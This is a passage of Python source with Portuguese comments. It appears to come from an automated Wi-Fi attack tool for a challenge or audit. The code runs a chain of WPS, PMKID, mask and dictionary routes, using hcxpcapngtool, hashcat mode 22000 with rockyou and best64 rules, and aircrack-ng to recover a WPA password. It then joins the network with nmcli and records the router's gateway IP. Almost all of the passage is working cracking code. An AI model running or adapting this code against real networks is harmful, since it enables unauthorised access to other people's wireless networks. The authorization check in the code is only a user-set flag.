            self.log("O roteador não respondeu com PMKID (comum em APs com WPA3/PMF). Rota D sem sucesso.")
            return False

        # Se o usuário informou uma máscara na Rota A, tenta ela no PMKID primeiro
        # — assim dá pra quebrar SEM depender de cliente conectado (handshake).
        if self._mask:
            self.log("PMKID capturado! Tentando quebrar com a máscara informada...")
            senha = self._crack_hc22000_com_mascara(pmkid_hash, self._mask)
            if senha:
                self.senha = senha
                self.rota_usada = "PMKID + máscara"
                self.log(f"Senha encontrada via PMKID + máscara: {self.senha}")
                return True
            self.log("Máscara não quebrou o PMKID. Tentando rockyou...")

        if not ROCKYOU.exists() or ROCKYOU.stat().st_size == 0:
            self.log("Wordlist rockyou.txt não disponível. Não é possível quebrar o PMKID capturado.")
            return False

        self.log("PMKID capturado! Tentando quebrar com hashcat (rockyou + best64)...")
        found_file = WORKDIR / "pmkid_found_gui.txt"
        found_file.unlink(missing_ok=True)
        self.run([
            "hashcat", "-m", "22000", str(pmkid_hash), str(ROCKYOU),
            "-r", "/usr/share/hashcat/rules/best64.rule",
            "--potfile-disable", "-o", str(found_file),
        ], timeout=1800)

        if found_file.exists() and found_file.stat().st_size > 0:
            linha = found_file.read_text().strip().splitlines()[-1]
            self.senha = linha.split(":", 1)[-1]
            self.rota_usada = "PMKID (hcxdumptool + hashcat)"
            self.log(f"Senha encontrada via PMKID: {self.senha}")
            return True

        self.log("PMKID capturado mas senha não encontrada no dicionário. Rota D sem sucesso final.")
        return False

    def rota_dicionario(self):
        self.log("--- Rota C: dicionário + regras (hashcat / aircrack-ng) ---")
        if not self.capturar_handshake():
            return False

        cap = self._ultimo_cap()
        if not ROCKYOU.exists() or ROCKYOU.stat().st_size == 0:
            self.log("Wordlist rockyou.txt não disponível. Não é possível rodar a Rota C.")
            return False

        hashfile = WORKDIR / "hash_gui.hc22000"
        if _tool_existe("hcxpcapngtool"):
            self.log("Convertendo captura para formato hashcat (hc22000)...")
            self.run(["hcxpcapngtool", "-o", str(hashfile), str(cap)])

        if hashfile.exists() and hashfile.stat().st_size > 0 and _tool_existe("hashcat"):
            self.log("Rodando hashcat (modo 22000) com rockyou + regra best64...")
            found_file = WORKDIR / "hashcat_found_gui.txt"
            found_file.unlink(missing_ok=True)
            self.run([
                "hashcat", "-m", "22000", str(hashfile), str(ROCKYOU),
                "-r", "/usr/share/hashcat/rules/best64.rule",
                "--potfile-disable", "-o", str(found_file),
            ], timeout=1800)
            if found_file.exists() and found_file.stat().st_size > 0:
                linha = found_file.read_text().strip().splitlines()[-1]
                self.senha = linha.split(":", 1)[-1]
                self.rota_usada = "Dicionário (hashcat + best64)"
                self.log(f"Senha encontrada via hashcat: {self.senha}")
                return True
            self.log("Hashcat não encontrou. Tentando fallback via aircrack-ng (CPU)...")

        self.log("Rodando aircrack-ng com rockyou.txt (pode demorar)...")
        r = self.run(["aircrack-ng", "-w", str(ROCKYOU), "-b", self.target["bssid"], str(cap)], timeout=1800)
        m = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", r.stdout)
        if m:
            self.senha = m.group(1)
            self.rota_usada = "Dicionário (aircrack-ng/rockyou)"
            self.log(f"Senha encontrada via aircrack-ng: {self.senha}")
            return True

        # Wordlists extras colocadas em wordlists/ (ex.: senhas BR), além do rockyou.
        for wl in sorted(WORDLIST_DIR.glob("*.txt")):
            if wl.resolve() == ROCKYOU.resolve():
                continue
            self.log(f"Tentando wordlist extra: {wl.name}...")
            if hashfile.exists() and hashfile.stat().st_size > 0 and _tool_existe("hashcat"):
                found_file = WORKDIR / "hashcat_extra_gui.txt"
                found_file.unlink(missing_ok=True)
                self.run([
                    "hashcat", "-m", "22000", str(hashfile), str(wl),
                    "-r", "/usr/share/hashcat/rules/best64.rule",
                    "--potfile-disable", "-o", str(found_file),
                ], timeout=1800)
                if found_file.exists() and found_file.stat().st_size > 0:
                    linha = found_file.read_text().strip().splitlines()[-1]
                    self.senha = linha.split(":", 1)[-1]
                    self.rota_usada = f"Dicionário ({wl.name} + best64)"
                    self.log(f"Senha encontrada via hashcat (wordlist extra): {self.senha}")
                    return True
            r2 = self.run(["aircrack-ng", "-w", str(wl), "-b", self.target["bssid"], str(cap)], timeout=1800)
            m2 = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", r2.stdout)
            if m2:
                self.senha = m2.group(1)
                self.rota_usada = f"Dicionário ({wl.name})"
                self.log(f"Senha encontrada via aircrack-ng (wordlist extra): {self.senha}")
                return True

        self.log("Senha não encontrada no dicionário rockyou.txt + regras best64.")
        self.log("Isso sugere senha forte (fora de listas comuns de senhas vazadas).")
        return False

    # ------------------------------------------------------------------
    # 7. orquestração automática
    # ------------------------------------------------------------------

    def executar_ataque(self, mascara=None):
        """mascara: dict opcional {tamanho, prefixo, tipo} — se vier, tenta
        a Rota A primeiro. Senão, segue direto WPS -> PMKID -> Dicionário."""
        if not self.autorizado:
            raise RuntimeError("Autorização não confirmada. Abortando antes de qualquer ataque.")

        self._mask = mascara  # guarda p/ a Rota D (PMKID) reusar se a Rota A falhar

        try:
            if mascara:
                if mascara.get("hashcat"):
                    ok = self.rota_mascara_hashcat(mascara["hashcat"], mascara.get("custom", ""))
                elif mascara.get("mascara"):
                    ok = self.rota_mascara(mascara=mascara["mascara"])
                else:
                    ok = self.rota_mascara(
                        mascara.get("tamanho"), mascara.get("prefixo", ""), mascara.get("tipo", "")
                    )
                if ok:
                    return True
                self.log("Rota de máscara não teve sucesso. Seguindo para as próximas rotas.")

            if self.rota_wps():
                return True
            self.log("Rota WPS não teve sucesso (ou não aplicável). Seguindo para PMKID.")

            if self.rota_pmkid():
                return True
            self.log("Rota PMKID não teve sucesso (ou não aplicável). Seguindo para dicionário.")

            if self.rota_dicionario():
                return True

            self.log("Nenhuma rota de ataque teve sucesso. Senha não descoberta.")
            return False
        except AttackAborted as e:
            self.log(f"Ataque interrompido: {e}")
            return False

    # ------------------------------------------------------------------
    # 8. conexão final + resumo
    # ------------------------------------------------------------------

    def conectar_e_obter_gateway(self):
        if not self.senha:
            self.log("Sem senha descoberta — não é possível conectar automaticamente para ler o gateway.")
            return

        self.restaurar_modo_gerenciado()
        time.sleep(3)

        self.log(f"Conectando à rede {self.target['essid']} com a senha descoberta...")
        self.run(["nmcli", "dev", "wifi", "connect", self.target["essid"], "password", self.senha])
        time.sleep(5)

        r = self.run(["ip", "route"])
        m = re.search(r"^default via (\S+)", r.stdout, re.MULTILINE)
        if m:
            self.ip_roteador = m.group(1)
            self.log(f"Gateway (IP do roteador) obtido: {self.ip_roteador}")
        else:
            self.log("Não foi possível obter o gateway após conectar.")

    def resumo(self):
        ch = int(self.target.get("ch", 0) or 0)
        if self.target.get("freq_label") == "5 GHz":
            freq_txt = "5 GHz"
        else:
            freq_txt = f"2.4 GHz ({2407 + ch * 5} MHz aprox.)"

        texto = (
            "================= RESPOSTAS DO DESAFIO =================\n"
            f"ESSID .............: {self.target.get('essid', '')}\n"
            f"Frequência ........: {freq_txt}\n"
            f"Canal .............: {self.target.get('ch', '')}\n"
            f"MAC do roteador ...: {self.target.get('bssid', '')}\n"
            f"IP do roteador ....: {self.ip_roteador or '<não obtido>'}\n"
            f"Senha .............: {self.senha or '<não descoberta>'}\n"
            f"Rota usada ........: {self.rota_usada or '<nenhuma / somente dados>'}\n"
            "===========================================================\n"
        )
        RESPOSTAS.write_text(texto)
        self.log(f"Resumo final salvo em {RESPOSTAS}")
        return {
            "essid": self.target.get("essid"),
            "freq": freq_txt,
            "canal": self.target.get("ch"),
            "bssid": self.target.get("bssid"),
            "ip": self.ip_roteador,
            "senha": self.senha,
            "rota": self.rota_usada,
            "texto": texto,
        }

    def cleanup(self):
        # Idempotente dentro de um mesmo encerramento: o Ctrl+C no servidor
        # dispara o handler de sinal E o atexit, chamando cleanup duas vezes
        # (dois restarts de NetworkManager seguidos). A flag é zerada ao iniciar
        # um novo modo monitor, então uma 2ª auditoria na mesma sessão limpa de novo.
        if self._cleanup_feito:
            return
        self._cleanup_feito = True
        self.log("Executando limpeza / restauração da interface...")
        try:
            self.matar_tudo()  # mata airodump/hashcat/reaver/etc. antes de mexer na placa
        except Exception as e:
            self.log(f"Aviso ao matar processos: {e}")
        try:
            self.restaurar_modo_gerenciado()
        except Exception as e:  # nunca deixar a limpeza travar o programa
            self.log(f"Aviso durante limpeza: {e}")
        self.log("Limpeza concluída.")


def _tool_existe(nome):
    r = subprocess.run(["bash", "-c", f"command -v {nome}"], capture_output=True)
    return r.returncode == 0
